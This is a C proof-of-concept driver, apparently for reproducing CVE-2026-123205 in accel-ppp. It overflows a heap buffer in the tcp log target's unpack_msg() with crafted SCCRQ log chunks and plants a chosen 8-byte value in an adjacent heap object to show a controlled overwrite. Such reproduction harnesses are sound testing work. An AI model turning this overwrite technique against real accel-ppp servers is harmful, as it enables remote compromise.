/* Replay driver for accel-ppp CVE-2026-123205.
 *
 * The production unpack_msg() (and, for the fixed build, log_unpack_msg())
 * bodies are extracted verbatim from the pinned upstream sources by run.sh
 * and linked here. This driver only builds the chunk list that a verbose
 * L2TP SCCRQ AVP dump would hand to the tcp log target.
 */
#include "stub.h"
#include <stdio.h>
#include <stdlib.h>

void unpack_msg(struct tcp_target_t *t, struct log_msg_t *msg);
#ifdef FIXED_MODE
int log_unpack_msg(struct log_msg_t *msg, char *buf, int size);
#endif

#define CHUNKS 66
#define CHUNK_LEN 64

static const char hdr_text[] = "accel-ppp L2TP SCCRQ AVP dump\n";

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "vuln";
	struct tcp_target_t t;
	struct log_msg_t msg;
	struct log_chunk_t *hdr;
	struct list_head chunks;
	size_t hdr_len = strlen(hdr_text);
	size_t total, chosen_abs;
	unsigned long long chosen = 0x1122334455667788ULL;
	char *buf, *victim;
	int i, j, first_changed = -1;
	unsigned long long readback = 0;

	memset(&t, 0, sizeof(t));
	memset(&msg, 0, sizeof(msg));
	buf = malloc(BUF_SIZE);
	victim = malloc(128);
	if (!buf || !victim)
		return 90;
	memset(buf, 0, BUF_SIZE);
	memset(victim, 0, 128);
	t.buf = buf;

	chosen_abs = (size_t)(victim - buf) + 4;
	total = hdr_len + (size_t)CHUNKS * CHUNK_LEN;
	printf("RUN mode=%s chunks=%d chunk_len=%d\n", mode, CHUNKS, CHUNK_LEN);
	printf("GEO buf_size=%d hdr_len=%zu total=%zu expected_oob=%zu victim_delta=%td chosen_abs=%zu\n",
	       BUF_SIZE, hdr_len, total, total - BUF_SIZE, victim - buf, chosen_abs);
	printf("CHOSEN marker=55465450 fn=0x1122334455667788\n");
	fflush(stdout);

	hdr = malloc(sizeof(*hdr) + hdr_len + 1);
	if (!hdr)
		return 91;
	memset(hdr, 0, sizeof(*hdr));
	hdr->len = (int)hdr_len;
	memcpy(hdr->msg, hdr_text, hdr_len + 1);
	msg.hdr = hdr;
	INIT_LIST_HEAD(&chunks);
	msg.chunks = &chunks;

	for (i = 0; i < CHUNKS; i++) {
		size_t abs_start = hdr_len + (size_t)i * CHUNK_LEN;
		struct log_chunk_t *c = malloc(sizeof(*c) + CHUNK_LEN);
		if (!c)
			return 92;
		memset(c, 0, sizeof(*c));
		c->len = CHUNK_LEN;
		for (j = 0; j < CHUNK_LEN; j++)
			c->msg[j] = (unsigned char)(0x41 + (j % 16));
		/* Plant the chosen 8-byte value at a chosen offset in the
		 * adjacent heap object, computed from the live pointers. */
		if (chosen_abs >= abs_start && chosen_abs + 8 <= abs_start + CHUNK_LEN)
			memcpy(c->msg + (chosen_abs - abs_start), &chosen, 8);
		list_add_tail(&c->entry, &chunks);
	}

	/* Production function under test; it never returns in ASan mode. */
	unpack_msg(&t, &msg);
	printf("AFTER pos=%d buf_size=%d buf_pos=%d\n", t.buf_size, t.buf_size, t.buf_pos);
	for (j = 0; j < 128; j++) {
		if (victim[j]) {
			first_changed = j;
			break;
		}
	}
	if (chosen_abs >= (size_t)(victim - buf) &&
	    chosen_abs + 8 <= (size_t)(victim - buf) + 128)
		memcpy(&readback, victim + (chosen_abs - (size_t)(victim - buf)), 8);
	printf("VICTIM first_changed=%d chosen_offset=%zu chosen_bytes=%016llx\n",
	       first_changed, chosen_abs - (size_t)(victim - buf), readback);
	printf("DONE mode=%s\n", mode);
	return 0;
}
